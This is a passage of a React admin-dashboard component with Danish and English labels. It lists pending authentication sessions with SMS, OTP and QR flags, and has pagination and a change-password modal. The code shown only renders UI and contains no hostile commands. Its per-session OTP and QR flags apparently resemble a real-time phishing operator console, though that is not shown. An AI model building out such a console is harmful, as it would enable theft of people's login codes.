                  Gem adgangskode
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    )
  }

  return (
    <div className="h-screen flex flex-col bg-gray-100" style={{ fontFamily: "'Inter', 'IBM Plex Sans', sans-serif" }}>
      <header className="h-[56px] bg-white border-b border-gray-200 px-6 shrink-0 z-10">
        <div className="flex items-center justify-between h-full">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center shadow-sm">
              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <div>
              <h1 className="text-gray-900 font-bold text-[15px]">Admin Dashboard</h1>
              <p className="text-[11px] text-gray-400">Manage authentication sessions</p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="relative">
              <svg className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
              <input type="text" placeholder="Search user or session..." value={searchQuery} onChange={(e) => { setSearchQuery(e.target.value); setCurrentPage(1) }}
                className="bg-gray-50 border border-gray-200 rounded-xl pl-9 pr-4 py-2 text-sm text-gray-900 w-[260px] focus:outline-none focus:border-blue-400 focus:ring-2 focus:ring-blue-500/10 placeholder-gray-400 transition-all" />
            </div>
            <button onClick={loadSessions} className="bg-gray-50 hover:bg-gray-100 border border-gray-200 text-gray-500 p-2 rounded-xl cursor-pointer transition-colors">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
            </button>
            <button onClick={() => setShowPasswordModal(true)} className="bg-gray-50 hover:bg-gray-100 border border-gray-200 text-gray-500 p-2 rounded-xl cursor-pointer transition-colors" title="Skift adgangskode">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </button>
            <button onClick={() => { localStorage.removeItem('admin_token'); onLogout() }}
              className="bg-gray-50 hover:bg-gray-100 border border-gray-200 text-gray-500 px-4 py-2 rounded-xl cursor-pointer transition-colors text-sm font-medium">
              Log ud
            </button>
          </div>
        </div>
      </header>

      <div className="px-6 py-2.5 flex items-center gap-2 border-b border-gray-200 bg-white shrink-0">
        <div className="flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-medium bg-amber-50 text-amber-700 border border-amber-200">
          Pending Sessions
          <span className="text-[11px] px-1.5 py-0.5 rounded-full font-bold bg-white/80">{filtered.length}</span>
        </div>
      </div>

      <div className="flex-1 overflow-auto p-6">
        {loading ? (
          <div className="flex items-center justify-center py-20">
            <div className="w-8 h-8 border-2 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 text-gray-400">
            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1" className="mb-4 opacity-30"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
            <p className="text-sm font-medium">No sessions found</p>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
              {paginated.map((s) => (
                <div key={s.sessionId} onClick={() => selectSession(s)}
                  className="bg-white rounded-2xl border border-gray-200 p-5 cursor-pointer hover:border-blue-300 hover:shadow-md transition-all group">
                  <div className="flex items-start justify-between mb-3">
                    <div>
                      <div className="text-gray-900 font-bold text-[15px] group-hover:text-blue-600 transition-colors">{s.userId}</div>
                      <div className="text-[11px] text-gray-400 font-mono mt-0.5">{s.sessionId.slice(0, 20)}...</div>
                    </div>
                    <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase ${s.status === 'verified' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`}>
                      {s.status}
                    </span>
                  </div>

                  <div className="flex items-center gap-3 text-[11px] text-gray-400 mb-3">
                    <span>{new Date(s.createdAt).toLocaleString('en-GB', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: 'short' })}</span>
                    <span className="text-gray-200">|</span>
                    <span>{s.logCount} events</span>
                  </div>

                  <div className="flex gap-1.5">
                    <Mini label="SMS" on={s.smsActive} />
                    <Mini label="OTP" on={s.otpActive} />
                    <Mini label="QR" on={s.qrVisible} />
                  </div>
                </div>
              ))}
            </div>

            {totalPages > 1 && (
              <div className="flex items-center justify-center gap-2 mt-6">
                <button onClick={() => setCurrentPage(p => Math.max(1, p - 1))} disabled={safePage <= 1}
                  className="px-3 py-2 rounded-xl text-sm font-medium bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 cursor-pointer transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
                  Prev
                </button>
                {Array.from({ length: totalPages }, (_, i) => i + 1).map(page => (
                  <button key={page} onClick={() => setCurrentPage(page)}
                    className={`w-9 h-9 rounded-xl text-sm font-bold cursor-pointer transition-all ${
                      page === safePage ? 'bg-blue-600 text-white shadow-sm' : 'bg-white border border-gray-200 text-gray-500 hover:bg-gray-50'
                    }`}>
                    {page}
                  </button>
                ))}
                <button onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))} disabled={safePage >= totalPages}
                  className="px-3 py-2 rounded-xl text-sm font-medium bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 cursor-pointer transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
                  Next
                </button>
              </div>
            )}
          </>
        )}
      </div>

      {showPasswordModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
          <div className="bg-white rounded-2xl shadow-2xl w-[400px] overflow-hidden">
            <div className="p-6">
              <div className="flex items-center justify-between mb-5">
                <h3 className="text-gray-900 font-bold text-base">Skift adgangskode</h3>
                <button onClick={() => { setShowPasswordModal(false); setPasswordError(''); setPasswordSuccess('') }} className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                </button>
              </div>
              <div className="space-y-3">
                <div>
                  <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Nuværende adgangskode</label>
                  <input type="password" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)}
                    className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                </div>
                <div>
                  <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Ny adgangskode</label>
                  <input type="password" value={newPassword} onChange={(e) => setNewPassword(e.target.value)}
                    className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                </div>
                <div>
                  <label className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1 block">Bekræft ny adgangskode</label>
                  <input type="password" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)}
                    onKeyDown={(e) => { if (e.key === 'Enter') handleChangePassword() }}
                    className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-blue-400" />
                </div>
              </div>
              {passwordError && <div className="text-red-600 text-[12px] mt-2 font-medium">{passwordError}</div>}
              {passwordSuccess && <div className="text-emerald-600 text-[12px] mt-2 font-medium">{passwordSuccess}</div>}
              <button onClick={handleChangePassword} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3 rounded-xl cursor-pointer transition-colors mt-4">
                Gem adgangskode
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

function Mini({ label, on }: { label: string; on: boolean }) {
  return <span className={`px-2 py-0.5 rounded text-[10px] font-medium ${on ? 'bg-emerald-100 text-emerald-700' : 'bg-gray-100 text-gray-400'}`}>{label}</span>
}
